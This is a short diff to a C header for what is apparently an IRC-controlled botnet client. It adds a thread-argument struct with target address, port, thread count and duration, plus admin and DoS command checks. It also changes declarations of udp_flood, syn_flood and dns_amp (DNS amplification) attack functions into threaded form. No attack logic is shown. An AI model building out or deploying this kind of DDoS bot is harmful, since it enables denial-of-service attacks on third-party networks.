@@ -99,6 +99,8 @@ typedef unsigned int SOCKET;
 
 #endif
 
+typedef unsigned int bool;
+
 /*
  * struct containing IRC
  * details of bot
@@ -129,6 +131,15 @@ typedef struct _message {
     char *msg;                      // entire message
     int msgSize;
 } Message, *pMessage;
+
+typedef struct _thr_args {
+    SOCKET s;
+    char *contact;
+    char *addr;
+    char *port;
+    int threads;
+    int time;
+} thr_args;
 
 /*
  * need to define some tcp/ip
@@ -259,11 +270,13 @@ void start_recv (SOCKET, pAccount);
 // exec.c
 int check_pass (char *);
 int add_admin (pAccount, pMessage);
-int is_admin (pAccount, pMessage);
+bool is_admin (pAccount, pMessage);
+bool is_dos (char *);
+int parse_args (SOCKET, pMessage);
 
 // dos.c
-void udp_flood (SOCKET s);
-void syn_flood (SOCKET s);
-void dns_amp (SOCKET s);
+void *udp_flood (void *);
+void *syn_flood (void *);
+void *dns_amp (void *);
 
 #endif
